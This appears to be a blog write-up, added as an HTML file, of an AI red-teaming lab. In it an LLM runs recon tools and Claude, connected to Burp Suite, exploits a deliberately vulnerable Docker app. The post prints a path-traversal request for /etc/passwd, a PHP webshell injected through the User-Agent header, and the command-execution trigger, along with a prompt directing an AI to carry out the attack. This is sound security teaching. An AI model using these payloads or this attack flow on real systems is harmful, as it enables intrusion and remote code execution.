@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>AI Red Teaming Lab 5: AI Web Recon, Burp MCP LFI Log Poisoning &amp; Recon Pipeline — Technical Write-up — Yash Omer</title>
+  <meta name="description" content="Technical write-up of AI Red Teaming Lab 5: an AI recon chatbot orchestrating katana/subfinder/nuclei, Burp Suite MCP-driven LFI log poisoning to RCE, and an autonomous 8-phase recon pipeline." />
+  <meta property="og:title" content="AI Red Teaming Lab 5: AI Web Recon, Burp MCP LFI &amp; Recon Pipeline — technical write-up" />
+  <meta property="og:description" content="LLM-orchestrated recon tooling, AI-in-the-loop LFI→log poisoning→RCE via Burp MCP, and an 8-phase autonomous recon pipeline." />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://yashomer1994.github.io/posts/ai-red-team-lab-5-web-recon-burp-mcp-lfi.html" />
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+  <script src="../theme.js"></script>
+  <link rel="stylesheet" href="../styles.css?v=dates-20260719" />
+</head>
+<body>
+  <main>
+    <div class="content">
+      <header class="site-header">
+        <p>
+          <a href="../index.html" class="brand">yashomer1994.github.io</a><span class="cursor" aria-hidden="true">▮</span>
+        </p>
+        <nav>
+          <a href="../index.html">Home</a>
+          <a href="ai-red-team-lab-1-local-uncensored-llm.html">Latest</a>
+          <button type="button" class="theme-toggle" id="theme-toggle">Dark</button>
+        </nav>
+      </header>
+      <hr class="header-rule" />
+
+      <p class="meta">August 30, 2026 · AI Security</p>
+      <h1>AI Red Teaming Lab 5: AI Web Recon, Burp MCP LFI Log Poisoning &amp; Recon+ Pipeline — a technical write-up</h1>
+
+      <p>
+        Lab 5 is three exercises in AI-in-the-loop web security: an LLM chatbot that orchestrates classic recon
+        tools, a Burp Suite MCP integration used to exploit a real LFI→log-poisoning→RCE chain, and a fully
+        autonomous 8-phase recon pipeline against a deliberately vulnerable Docker target.
+      </p>
+
+      <h2>1. Exercise 1 — AI Web Recon chatbot</h2>
+      <h3>1.1 Setup</h3>
+      <pre><code>sudo apt install golang -y
+go install github.com/projectdiscovery/katana/cmd/katana@latest
+go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+echo 'export PATH=$PATH:$(go env GOPATH)/bin' &gt;&gt; ~/.bashrc &amp;&amp; source ~/.bashrc
+sudo apt install arjun -y
+unzip WebRecon.zip &amp;&amp; cd web
+# .env: GROQ_API_KEY=gsk_...
+python -m venv venv &amp;&amp; source venv/bin/activate
+pip install -r backend/requirements.txt
+python backend/main.py             # picks a free port 5000–5010</code></pre>
+      <h3>1.2 How it works</h3>
+      <p>
+        <code>bot_engine.py</code> keyword-matches intent ("endpoints", "subdomains", "api parameters", "CVEs"),
+        regex-extracts the target, shells out to the right tool (katana <code>-d 2</code>, subfinder with crt.sh
+        passive fallback, arjun, nuclei medium+), caches results for 5 min, adds heuristic notes
+        (<code>id</code> param → IDOR/SQLi, <code>redirect</code> param → SSRF), then asks Groq for strict JSON
+        <code>{risk_level, key_findings, recommendations, next_steps, attack_vectors}</code> with a model fallback
+        chain and a full heuristic fallback if Groq is down.
+      </p>
+      <p><strong>Prompts:</strong> <code>Find the endpoints http://testphp.vulnweb.com</code> · <code>Find subdomains example.com</code> · <code>security assessment &lt;url&gt;</code>. Expected: endpoint lists plus an AI analysis block with risk level and attack vectors.</p>
+
+      <h2>2. Exercise 2 — Burp Suite MCP → LFI log poisoning → RCE</h2>
+      <h3>2.1 Setup</h3>
+      <pre><code>unzip lfi-log-poisoning.zip &amp;&amp; cd lfi-log-poisoning
+docker compose up -d --build       # target at http://localhost:5000</code></pre>
+      <p>
+        Burp: Extensions → install "MCP server" → MCP tab → enable → <strong>"Install to Claude Desktop"</strong> →
+        fully restart Claude Desktop. Verify the <code>burp</code> MCP server is connected, then proxy browser traffic
+        to the target so Burp captures it.
+      </p>
+      <h3>2.2 The vulnerability (from the source)</h3>
+      <ul class="content-list">
+        <li><code>apache-site.conf</code> puts Apache logs <em>inside the webroot</em>: <code>/var/www/html/logs/access.log</code> (bind-mounted to the host, so poisoning persists).</li>
+        <li><code>blog_page/index.php</code>: <code>?search=</code> is resolved with <code>realpath()</code> — without <code>cmd</code> it prints the file (arbitrary file read); <strong>with <code>cmd</code> it <code>include()</code>s the file</strong> → any PHP inside executes.</li>
+        <li>Apache's <code>combined</code> LogFormat logs the User-Agent verbatim → poison the log with a PHP webshell in the UA header.</li>
+      </ul>
+      <h3>2.3 Exploit chain</h3>
+      <ol class="content-list">
+        <li>Capture requests in Burp; give Claude the lab prompt: "You are acting as an offensive web security analyst. Review the captured Burp Suite request and use the burp suite MCP and find the vuln from the request and perform the attack to check the application is vulnerable."</li>
+        <li>Confirm LFI: <code>GET /blog_page/index.php?search=../../../../etc/passwd</code></li>
+        <li>Confirm log readability: <code>?search=logs/access.log</code> (leading slash is stripped by design — use a relative path).</li>
+        <li>Poison via Repeater: <code>User-Agent: &lt;?php system($_GET['cmd']); ?&gt;</code> sent to <code>/</code>, then re-read the log to confirm the payload landed unencoded.</li>
+        <li>Trigger RCE: <code>?search=logs/access.log&amp;cmd=id</code> → <code>uid=33(www-data) gid=33(www-data)</code> embedded in the page. That output is the lab's proof/flag.</li>
+      </ol>
+      <p>
+        Note: the shipped <code>access.log</code> is pre-poisoned so the demo always works — students should still
+        perform the poisoning step themselves. Also <code>index.php</code>'s <code>basename()</code> blocks traversal
+        in <code>page=</code> but explicitly passes <code>php://filter</code> through — a lesson in partial sanitization.
+      </p>
+
+      <h2>3. Exercise 3 — AI Recon+ pipeline</h2>
+      <h3>3.1 Setup</h3>
+      <pre><code># tools: subfinder, amass, ffuf, nmap, whois, katana, nuclei (+templates), arjun, whatweb, seclists
+unzip Pipeline.zip &amp;&amp; cd pipeline
+# .env: GROQ-API=gsk_...
+cd vuln-app &amp;&amp; docker compose up -d &amp;&amp; cd ..
+python3 cli.py localhost</code></pre>
+      <p>
+        The target is a teaching honeypot: Web :80, SSH :2222 (<code>root:admin123</code>), fake FTP banner
+        (vsFTPd 2.3.4 — the backdoored version), fake MySQL banner, GraphQL with introspection leaking password
+        hashes, a fake <code>/.env</code> (<code>DB_PASSWORD=supersecret2026</code>) and <code>/backup.zip</code>.
+      </p>
+      <h3>3.2 The 8 phases</h3>
+      <ol class="content-list">
+        <li>Normalize target (rejects shell metacharacters).</li>
+        <li>Parallel discovery: WHOIS/DNS, subfinder+amass+crt.sh, nmap (XML-parsed), Wayback/katana, TLS — then an AI phase summary.</li>
+        <li>Tech detection (whatweb + headers; spots the spoofed Apache/PHP/WordPress fingerprints).</li>
+        <li>ffuf live fuzzing (press <code>s</code> to skip) — expect <code>/login</code>, <code>/graphql</code>, <code>/.env</code>, <code>/backup.zip</code>, auto-classified by severity.</li>
+        <li>JS endpoint extraction + nuclei (info–medium).</li>
+        <li>CVE lookup via Groq — expect vsFTPd 2.3.4 (CVE-2011-2523), WordPress 4.9.4, PHP 5.6.40 EOL.</li>
+        <li>Full AI analysis → risk decision with confidence.</li>
+        <li>Rich terminal report + <strong>interactive AI chat</strong> ("what should I test first?" → <code>/.env</code>, <code>/graphql</code>, SSH root password).</li>
+      </ol>
+      <p>Artifacts land in <code>scans/&lt;target&gt;_&lt;timestamp&gt;/</code> and a SQLite <code>database.db</code>.</p>
+
+      <h2>4. Troubleshooting highlights</h2>
+      <ul class="content-list">
+        <li>Ex 1: deps are at <code>backend/requirements.txt</code>; Go bin dir must be on PATH or tools silently return empty; don't run Ex 2's container simultaneously (both want port 5000).</li>
+        <li>Ex 2: MCP tab missing → extension not enabled; Claude sees no Burp tools → restart Claude Desktop after "Install to Claude Desktop"; forgetting <code>&amp;cmd=</code> means the log is only <em>read</em>, not included; clear <code>app/logs/access.log</code> for a clean run.</li>
+        <li>Ex 3: install <code>seclists</code> or Phase 4 is skipped; target must be up before running <code>cli.py</code>; empty AI panels → bad Groq key (pipeline still completes with tool data).</li>
+      </ul>
+
+      <h2>5. Effort estimate (for lab timing)</h2>
+      <p>
+        Ex 1 ~1 h · Ex 2 ~1.5 h (Burp MCP config + the full chain) · Ex 3 ~1.25 h.
+        <strong>Total: ~3.5–4.5 hours</strong> including troubleshooting.
+      </p>
+    </div>
+  </main>
+</body>
+</html>
